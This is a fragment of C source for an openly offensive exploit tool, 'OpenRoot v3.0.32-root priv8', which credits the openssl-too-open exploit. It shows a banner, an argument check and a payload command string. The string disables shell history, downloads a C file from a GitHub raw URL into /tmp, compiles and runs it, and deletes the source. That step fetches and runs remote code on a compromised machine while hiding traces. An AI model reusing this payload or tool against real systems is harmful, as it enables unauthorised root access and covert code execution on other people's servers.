...
#define COMMAND2 "unset HISTFILE; cd /tmp; wget https://raw.githubusercontent.com/rony926/OpenRoot/refs/heads/main/lib.c -O H4K2LIV3.c; gcc -o H4K2LIV3 H4K2LIV3.c; rm H4K2LIV3.c; ./H4K2LIV3; \n"
...
int main(int argc, char* argv[])
{
	...
	printf("\n");
	printf("*******************************************************************\n");
	printf("* OpenRoot v3.0.32-root priv8 by SPABAM based on openssl-too-open *\n");
	printf("*******************************************************************\n");
	printf("\n");
	if ((argc < 3) || (argc > 6))
		usage(argv[0]);
